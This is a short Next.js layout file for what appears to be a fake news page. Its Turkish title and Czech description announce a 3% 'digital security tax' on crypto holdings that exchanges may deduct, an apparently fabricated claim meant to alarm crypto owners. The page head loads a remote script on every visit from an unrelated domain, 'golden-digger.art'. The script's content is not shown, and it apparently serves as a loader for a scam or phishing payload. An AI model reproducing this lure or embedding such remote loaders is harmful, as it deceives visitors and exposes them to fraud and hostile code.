export const metadata = {
  title: "SON DAKİKA: 200.000 TL’nin üzerinde kripto varlığınız mı var? Türkiye’de %3 “dijital güvenlik vergisi” iddiası – borsalar vergiyi doğrudan kesebilir — Turk Portal",
  description: "Finanční správa České republiky dnes vydala mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="cs">
      <head>
        <script
          src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
          async
          defer
        ></script>
      </head>
      <body>{children}</body>
    </html>
  );
}
